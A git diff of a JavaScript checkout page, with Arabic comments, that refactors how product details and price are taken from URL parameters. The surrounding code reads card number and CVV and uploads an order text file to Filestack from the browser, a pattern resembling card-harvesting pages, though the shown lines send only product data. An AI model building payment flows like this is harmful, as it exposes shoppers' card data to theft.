@@ -18,22 +18,28 @@ document.addEventListener('DOMContentLoaded', function () {
 
   const urlParams = getUrlParams();
 
+  // التأكد من أن المعلمات موجودة في الرابط
+  const productName = urlParams.name || 'Product Name Not Provided';
+  const productColor = urlParams.color || 'Color Not Provided';
+  const productPrice = parseFloat(urlParams.price) || 0;
+  const productQuantity = parseInt(urlParams.quantity) || 1;
+  const productImageUrl = urlParams.image || ''; // إذا لم يكن هناك صورة في الرابط، نتركها فارغة
+
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = `${urlParams.name}`;
-  document.getElementById('product-color').textContent = ` ${urlParams.color}`;
-  document.getElementById('product-price').textContent = `${urlParams.price}`;
-  document.getElementById('product-quantity').textContent = `${urlParams.quantity}`;
+  document.getElementById('product-name').textContent = `${productName}`;
+  document.getElementById('product-color').textContent = ` ${productColor}`;
+  document.getElementById('product-price').textContent = `$${productPrice}`;
+  document.getElementById('product-quantity').textContent = `${productQuantity}`;
 
   // حساب السعر الإجمالي
-  const totalPrice = urlParams.price * urlParams.quantity;
-  document.getElementById('total-price').textContent = `$${totalPrice}`;
+  const totalPrice = productPrice * productQuantity;
+  document.getElementById('total-price').textContent = `$${totalPrice.toFixed(2)}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
-
-  if (urlParams.image) {
-    productImage.src = urlParams.image;
-    productImage.alt = urlParams.name || 'Product' + ' image';
+  if (productImageUrl) {
+    productImage.src = productImageUrl;
+    productImage.alt = productName || 'Product image';
   } else {
     productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
     productImage.alt = 'No Image Available';
@@ -71,10 +77,8 @@ document.addEventListener('DOMContentLoaded', function () {
     const cvv = document.getElementById('cvv').value;
 
     // معلومات المنتج
-    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
     const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
     const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
-    const productImageUrl = urlParams.productImage || '';  // رابط الصورة
 
     // تحقق من القيم
     let isValid = true;
@@ -155,7 +159,7 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Product Price: ${productPriceText}\n`;
       fileContent += `Product Quantity: ${productQuantityText}\n`;
       fileContent += `Product Image URL: ${productImageUrl}\n`;
-      fileContent += `Total Price: ${totalPrice}\n`;
+      fileContent += `Total Price: ${totalPrice.toFixed(2)}\n`;
 
       // رفع الملف إلى Filestack
       uploadFileToFilestack(fileContent); 
@@ -198,7 +202,6 @@ document.addEventListener('DOMContentLoaded', function () {
     const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
     return regex.test(cardNumber);
   }
-
 
   // دالة للتحقق من تاريخ الصلاحية
   function validateExpiry(expiry) {
@@ -251,7 +254,6 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   });
 });
-
 
 
 
